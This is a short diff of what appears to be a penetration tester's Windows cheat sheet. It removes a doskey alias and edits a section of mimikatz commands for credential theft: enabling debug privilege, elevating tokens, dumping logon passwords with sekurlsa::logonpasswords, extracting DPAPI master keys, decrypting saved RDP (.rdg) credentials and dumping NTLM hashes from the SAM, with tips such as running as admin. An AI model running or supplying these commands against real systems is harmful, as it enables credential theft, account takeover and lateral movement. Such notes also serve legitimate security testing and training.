@@ -1,7 +1,4 @@
 ================================== 
-doskey ll=dir /a $*
-
-================================== 
 whoami
 hostname                    
 echo %username% 
@@ -412,9 +409,9 @@ mimikatz
 mimikatz_64.exe              ..as admin if you can 
 privilege::debug  
 token::elevate  
-sekurlsa::logonpasswords     ..anything good?  
+sekurlsa::logonpasswords     ..auto-logon passwords  
+
 sekurlsa::dpapi              ..extract DPAPI masterkeys 
- 
 dpapi::rdg                   ..decrypt .rdg files (needs masterkey) 
  
 lsadump::sam                 ..NTLM 
